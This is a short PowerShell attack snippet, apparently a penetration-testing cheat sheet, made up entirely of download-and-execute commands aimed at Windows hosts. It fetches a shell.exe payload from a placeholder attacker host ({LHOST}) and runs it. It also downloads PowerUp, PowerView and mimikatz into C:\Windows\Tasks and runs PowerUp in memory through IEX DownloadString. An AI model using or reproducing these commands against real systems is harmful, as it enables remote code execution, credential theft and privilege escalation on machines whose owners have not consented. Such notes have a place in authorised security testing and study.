# # # Single target
#Invoke-WebRequest -Uri http://{LHOST} -OutFile C:\Windows\Tasks\shell.exe; Start-Process -NoNewWindow -FilePath C:\Windows\Tasks\shell.exe


# # # Multi Target
$baseUrl = "http://{LHOST}/"
$fileNames = @("PowerUp.ps1", "PowerView.ps1", "mimikatz.exe")
$downloadPath = "C:\Windows\Tasks"

foreach ($fileName in $fileNames) {
	$url = $baseUrl + $fileName
	$filePath = Join-Path $downloadPath $fileName
	Invoke-WebRequest -Uri $url -OutFile $filePath
	Write-Host "Downloaded $fileName to $filePath"
}
IEX (New-Object Net.WebClient).DownloadString(‘https://{LHost}/PowerUp.ps1’);Invoke-AllChecks

